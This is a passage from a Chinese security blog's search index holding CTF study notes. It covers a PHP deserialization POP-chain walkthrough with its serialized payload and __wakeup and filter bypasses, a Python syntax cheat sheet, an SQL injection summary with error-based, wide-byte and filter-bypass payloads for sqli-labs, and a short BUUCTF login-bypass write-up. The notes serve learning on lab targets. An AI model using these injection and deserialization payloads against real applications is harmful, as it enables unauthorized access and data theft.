class_">Start</span>();</span><br></pre></td></tr></table></figure><p>跟进**__isset()<strong>，可以发现直接将</strong>func<strong>属性当成函数调用刚好可以触发</strong>__invoke()<strong>方法，所以此时就到了pop链的最后一个部分，现在只需要将</strong>func<strong>属性实例化为</strong>Sec**对象即可触发</p><p>因此最后一步为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;name-&gt;var-&gt;obj-&gt;func = new Sec();</span><br></pre></td></tr></table></figure><p>直接将文中需要利用的类全部copy下来，<strong>注意！！！</strong>：因为私有类属性无法在类外进行操作，所以我们要把属性全部改成公有属性即 public属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Start&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $func;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Sec&#123;</span><br><span class="line">    public $obj;</span><br><span class="line">    public $var;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Easy&#123;</span><br><span class="line">    public $cla;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class eeee&#123;</span><br><span class="line">    public $obj;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">$res = new Start();</span><br><span class="line">$res-&gt;name = new Sec();</span><br><span class="line">$res-&gt;name-&gt;obj = new Easy();</span><br><span class="line">$res-&gt;name-&gt;var = new eeee(); </span><br><span class="line">$res-&gt;name-&gt;var-&gt;obj = new Start();</span><br><span class="line">$res-&gt;name-&gt;var-&gt;obj-&gt;func = new Sec();</span><br><span class="line">echo serialize($res);</span><br></pre></td></tr></table></figure><p>得到payload为：</p><p>  O:5:”Start”:2:{s:4:”name”;O:3:”Sec”:2:{s:3:”obj”;O:4:”Easy”:1:{s:3:”cla”;N;}s:3:”var”;O:4:”eeee”:1:{s:3:”obj”;O:5:”Start”:2:  {s:4:”name”;N;s:4:”func”;O:3:”Sec”:2:{s:3:”obj”;N;s:3:”var”;N;}}}}s:4:”func”;N;} </p><p>最后post传参，pop&#x3D;以上payload即可得到flag</p><h3 id="7-PHP原生类反序列化利用"><a href="#7-PHP原生类反序列化利用" class="headerlink" title="7 PHP原生类反序列化利用"></a>7 PHP原生类反序列化利用</h3><h3 id="8-字符串逃逸"><a href="#8-字符串逃逸" class="headerlink" title="8 字符串逃逸"></a>8 字符串逃逸</h3><p>反序列化字符串溢出造成的攻击问题一般是因为对序列化之后的字符串进行了字符替换或者过滤等造成前后字符长度有差异；攻击者可以通过可控的属性传入payload造成对象注入:</p><ul><li>对象的属性值可控</li><li>对序列化之后的字符串进行替换或者过滤造成前后长度有差异</li></ul><h5 id="情况1：过滤后字符变多"><a href="#情况1：过滤后字符变多" class="headerlink" title="情况1：过滤后字符变多"></a>情况1：过滤后字符变多</h5><h3 id="9-反序列化绕过小Trick"><a href="#9-反序列化绕过小Trick" class="headerlink" title="9 反序列化绕过小Trick"></a>9 反序列化绕过小Trick</h3><h5 id="1-wakeup-函数绕过"><a href="#1-wakeup-函数绕过" class="headerlink" title="1 wakeup()函数绕过"></a>1 wakeup()函数绕过</h5><p>版本：PHP5 &lt; 5.6.25 ||  PHP7 &lt; 7.0.10</p><p>利用方式：<code>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &#x27;abc&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;a=&#x27;666&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>输出结果为<code>666</code></p><p>而把对象属性个数的值增大执行<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>输出结果为abc</p><p>​2 绕过部分正则</p><p>​3 16进制绕过字符的过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;S:4:&quot;\00*\00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成16进制解析。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">例子：&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;admin&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function check($data)&#123;</span><br><span class="line">    if(stristr($data, &#x27;username&#x27;)!==False)&#123;</span><br><span class="line">        echo(&quot;你绕不过！！&quot;.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 未作处理前</span><br><span class="line">$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;</span><br><span class="line">$a = check($a);</span><br><span class="line">unserialize($a);</span><br><span class="line">// 做处理后 \75是u的16进制</span><br><span class="line">$a = &#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;</span><br><span class="line">$a = check($a);</span><br><span class="line">unserialize($a);</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>Y4神：[(1条消息) <a href="https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%7B%22request_id%22:%22166558985316782417042402%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=166558985316782417042402&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-113588692-null-null.nonecase&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4450">CTF]PHP反序列化总结_Y4tacker的博客-CSDN博客_ctf php反序列化</a></p><p>末初师傅：<a href="https://mochu.blog.csdn.net/article/details/106909777#PHP_Session_701">(1条消息) 由浅入深理解PHP反序列化漏洞_末初mochu7的博客-CSDN博客</a></p><p>向两位佬学习！！！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python语法速通</title>
      <link href="/2022/10/04/Python%E8%AF%AD%E6%B3%95%E9%80%9F%E9%80%9A/"/>
      <url>/2022/10/04/Python%E8%AF%AD%E6%B3%95%E9%80%9F%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="python语法"><a href="#python语法" class="headerlink" title="python语法"></a>python语法</h1><hr><ul><li>1 标识符： 只允许出现英文，中文（不推荐，可能会报错），数字(不可以开头)和下划线（_）。</li></ul><p><strong>注意：大小写敏感（区分），不可使用关键字</strong></p><ul><li>转移字符\可以接触引号的效用  例如： “\“黑马程序员\””       三引号用变量接收可以分多行写，不接收就是注释</li><li>字符串拼接： name&#x3D;&#x3D;”黑马程序员”  %d：占位整数  %f：占位小数</li></ul><p>​   massage&#x3D;“学IT: %s ” % name     &#x3D; 学IT： 黑马程序员    </p><p><strong>注意：多个变量占位需要在变量前后加括号</strong></p><hr><ul><li>字符串精度控制：   %7.2f   代表7位整数，2位小数     %5d   表示5位整数</li><li>字符串快速格式化：print（f“名称：{变量}，”）   f： format格式</li></ul><p>注意：不理会类型，不做精度控制（适合对精度无要求的使用）</p><hr><ul><li><strong>注意：无论输入什么，input（）的数据类型都是字符串型</strong></li></ul><hr><ul><li><p>if elif else 注意点： if elif 可以用多个，elif必须带条件，判断是互斥且有序的。 else不用带条件。</p></li><li><p>输出不换行  print（“hello”，end&#x3D;‘’） print （“world”，end&#x3D;‘’）即输出在同一行          print（）为换行</p></li></ul><hr><ul><li>for循环：无法定义循环条件      <strong>{for  临时变量   in   被处理的数据}</strong> 为语法格式   临时变量最好不要在for循坏外部使用</li><li>range语句  语法1：<strong>range （num）从0到num的值</strong>   为1个序列</li><li>语法2：      <strong>range（num1，num2）从1到2的值为1个序列</strong>   </li><li>语法3：      <strong>range（1，2，3）1到2每个按3的方式加  例如5 10 2    序列为{5，7，9}</strong></li></ul><hr><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><p>def 函数名(传入参数):                 <strong>参数，返回值可以省略</strong>   省略时，可以返回return None</p><p>​  函数体“””  “””三引号可以在有参数的函数里写注释，自动补齐注释格式</p><p>​  return 返回值函数内部的变量不加 global 为局部变量</p><hr><h2 id="数据容器-2022-x2F-9-x2F-29"><a href="#数据容器-2022-x2F-9-x2F-29" class="headerlink" title="数据容器        2022&#x2F;9&#x2F;29"></a>数据容器        2022&#x2F;9&#x2F;29</h2><p>分为5类：列表，元组，字符串，集合，字典。         </p><p>append（元素）插入到结尾             insert（位置，“元素”)插入位置的前一位</p><h5 id="元组tuple-内容不可修改，里面嵌套的list列表可以修改-，语法和列表基本一致"><a href="#元组tuple-内容不可修改，里面嵌套的list列表可以修改-，语法和列表基本一致" class="headerlink" title="元组tuple  内容不可修改，里面嵌套的list列表可以修改 ，语法和列表基本一致"></a>元组tuple  内容不可修改，里面嵌套的list列表可以修改 ，语法和列表基本一致</h5><p>字符串 ：内容不可修改  replace可以替代内容形成一个新的字符串返回值</p><p>集合不支持下表索引，不可会用while循环去遍历</p><p><img src="/2022/10/04/Python%E8%AF%AD%E6%B3%95%E9%80%9F%E9%80%9A/5.png"></p><hr><p>lambda 传入参数：函数体（一行代码）如果不用变量接收，只能每次重写</p><hr><h2 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h2><p>read和readlines 两种方法读取文件内容  readline读取一行内容</p><p>对象.read()：表示全部读取  对象.read（num） ：num表示读取多少字节</p><p>对象.close（）：表示关闭文件</p><p>write后需要flush才能有内容，或者直接close有内置flush的功能        （可以创建文件，但也会覆盖内容）</p><p>a模式不会覆盖原文本内容</p><hr><h2 id="异常认识"><a href="#异常认识" class="headerlink" title="异常认识"></a>异常认识</h2><hr><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>使用格式：</p><p>import time</p><h5 id="request模块库：主要用来发-送-HTTP-请求"><a href="#request模块库：主要用来发-送-HTTP-请求" class="headerlink" title="request模块库：主要用来发 送 HTTP 请求"></a>request模块库：主要用来发 送 HTTP 请求</h5><table><thead><tr><th>delete(<em>url</em>, <em>args</em>)</th><th>发送 DELETE 请求到指定 url</th></tr></thead><tbody><tr><td>get(<em>url</em>, <em>params, args</em>)</td><td>发送 GET 请求到指定 url</td></tr><tr><td>head(<em>url</em>, <em>args</em>)</td><td>发送 HEAD 请求到指定 url</td></tr><tr><td>patch(<em>url</em>, <em>data, args</em>)</td><td>发送 PATCH 请求到指定 url</td></tr><tr><td>post(<em>url</em>, <em>data, json, args</em>)</td><td>发送 POST 请求到指定 url</td></tr><tr><td>put(<em>url</em>, <em>data, args</em>)</td><td>发送 PUT 请求到指定 url</td></tr><tr><td>request(<em>method</em>, <em>url</em>, <em>args</em>)</td><td>向指定的 url 发送指定的请求方法</td></tr></tbody></table><hr><h2 id="可视化图表"><a href="#可视化图表" class="headerlink" title="可视化图表"></a>可视化图表</h2><p>json：带有特定格式的字符串。例子：要么是字典，要么是列表（里面嵌套字典）  用来语言之间转换的中转数据</p><p>使用需要导入：import  json</p><p>先定义一个列表，或者字典，然后用    变量&#x3D;json.dumps(变量名)的格式把列表或者字典转变为json格式</p><p>注意：字典，列表转换的时候里面的元素，字典如果有中文，需要遵循dumps（变量名，ensure_ascii&#x3D;false）的格式确保中文的输出</p><p>json格式转化为列表：变量&#x3D;json.loads（变量名）   来转换</p><hr><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><hr><p>基本语法：class  类名称:</p><p>​类的属性 （定义在类中的变量），即成员变量</p><p>​类的行为 （定义在类中的函数），即成员方法</p><p>创建类的语法：对象&#x3D;类名称（）</p><p>类里面的方法的语法：      def  函数名(self)   self为系统自带，调用方法时可以当self不存在，不用传参数</p><p>   构造函数：两个下划线init两个下划线()方法</p><p>私有成员，变量在类中以两个下划线开头即可。</p>]]></content>
      
      
      <categories>
          
          <category> 编程语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2022/10/04/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/10/04/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><h3 id="一：-GET-x2F-POST传参注入-：一般情况下有回显"><a href="#一：-GET-x2F-POST传参注入-：一般情况下有回显" class="headerlink" title="一： GET&#x2F;POST传参注入 ：一般情况下有回显"></a>一： GET&#x2F;POST传参注入 ：一般情况下有回显</h3><p>先判断注入类型：?id&#x3D;1 and 1&#x3D;1   看过滤了(,‘,“,等等。</p><p>然后判断列的个数： ?id&#x3D;1’ order by x – a         以引号闭合为例子，x代表数字，来判断列数</p><h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2 报错注入"></a>2 报错注入</h4><p>‘ and updatexml(1,concat(0x7e,(select talbe_schema from informaiton_schema.tables where table_schema&#x3D;’库名’limit 0,1),0x7e)1,) –  a   一般形式的字符类报错注入         0x7e为16进制   的  ~  波浪线符号</p><h4 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3 布尔盲注"></a>3 布尔盲注</h4><p>and length(database())&gt;1</p><h4 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4 时间盲注"></a>4 时间盲注</h4><h4 id="5-二次注入"><a href="#5-二次注入" class="headerlink" title="5 二次注入"></a>5 二次注入</h4><p>通常看到 PHP MySQL_real_escape_string()函数时，这个函数的作用是用来防止数据库被攻击，可以利用二次注入。</p><p>sqli-labs第25关为例子，admin’#创建这个账号后修改密码，由于单引号闭合后，又加了#，注释了后面的密码，所以修改admin’#的密码相当于直接修改了admin的密码，从而得到flag，实现二次注入</p><h4 id="6-宽字节注入：页面和后台的编码不同而产生的漏洞"><a href="#6-宽字节注入：页面和后台的编码不同而产生的漏洞" class="headerlink" title="6 宽字节注入：页面和后台的编码不同而产生的漏洞"></a>6 宽字节注入：页面和后台的编码不同而产生的漏洞</h4><p>‘单引号被过滤了，用%df’来拼接成汉字即可绕过(适用于GET传参时)</p><p>在POST传参时，用bs修改hex文件来达到目的 例如sqli-labs 第34关</p><p>当然，一些汉字（例如：汉）为3个字节时，2个字节一组可以与转义符\相匹配代替%df，从而使转义符失效</p><h4 id="7-堆叠注入：可以使用多个SQL语句，多个查询用分号隔开，这就是产生堆叠注入的原因"><a href="#7-堆叠注入：可以使用多个SQL语句，多个查询用分号隔开，这就是产生堆叠注入的原因" class="headerlink" title="7 堆叠注入：可以使用多个SQL语句，多个查询用分号隔开，这就是产生堆叠注入的原因"></a>7 堆叠注入：可以使用多个SQL语句，多个查询用分号隔开，这就是产生堆叠注入的原因</h4><p>原理看到函数：Mysqli_multi_query()函数时，可以想到堆叠注入</p><h3 id="二-：当存在过滤时，存在的过滤方式"><a href="#二-：当存在过滤时，存在的过滤方式" class="headerlink" title="二 ：当存在过滤时，存在的过滤方式"></a>二 ：当存在过滤时，存在的过滤方式</h3><p><strong>1</strong>   如果过滤了 –  a  和#  注释方式不管用  可以在注释原来的地方替换为      or  ‘1’&#x3D;’1   来进行闭合，实行SQL注入</p><p>例如：preg_replace()函数则为过滤用。一般替换（不能用的字符）为空    。在这个函数中加&#x2F;i表示大小写都没法用</p><p><strong>2</strong> 如果过滤了 and 和 or，无法连接代码，可以用&amp;&amp;替换and，||替换or</p><p>注意：&amp;&amp;使用需要用url编码：%26%26。不编码的话当作多参数传参，无法生效。</p><p>sqli-labs第25关为例子  ，最后需要用information的库，但or会被替换为空，爆出来的结果为infmation，无法爆出所需要的表。所以这里可以采用双写绕过，在报错注入语句里写 from infoorrmation_schema  即可。</p><p><strong>3</strong> 过滤\s ：表示不能有空白      空格可以用%0a或者%a0来替换试试，也可以用select 后面多加个括号()来替换</p><p>例如sqli-labs第26关：payload为： ?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;’security’))),1))||’0</p><p><strong>4</strong> 当union和select也被过滤时。先看是不是所有的大小写都被过滤，如果只是单独的，可以用selEct和uniOn来替换。</p><p>注意：查表的时候的单引号用database()函数代替，表名可以用十六进制来替代，因为MySQL支持16进制的表达。</p><h3 id="三-：基于burp-suite修改请求头来进行注入"><a href="#三-：基于burp-suite修改请求头来进行注入" class="headerlink" title="三 ：基于burp suite修改请求头来进行注入"></a>三 ：基于burp suite修改请求头来进行注入</h3><p>1 基于reference</p><p>2 基于cookie</p><p>3 基于X-forward</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUCCTF web</title>
      <link href="/2022/10/02/BUCCTF-web/"/>
      <url>/2022/10/02/BUCCTF-web/</url>
      
        <content type="html"><![CDATA[<hr><hr><h1 id="web-wp"><a href="#web-wp" class="headerlink" title="web wp"></a>web wp</h1><blockquote><p><img src="/2022/10/02/BUCCTF-web/EasySQL.png"></p></blockquote><p>根据题意，简单的SQL，进入界面，发现是一个简单的登录界面，所以随便输一个用户名：admin，密码用万能的： ‘ or 1&#x3D;1 ,flag就出来了</p>]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
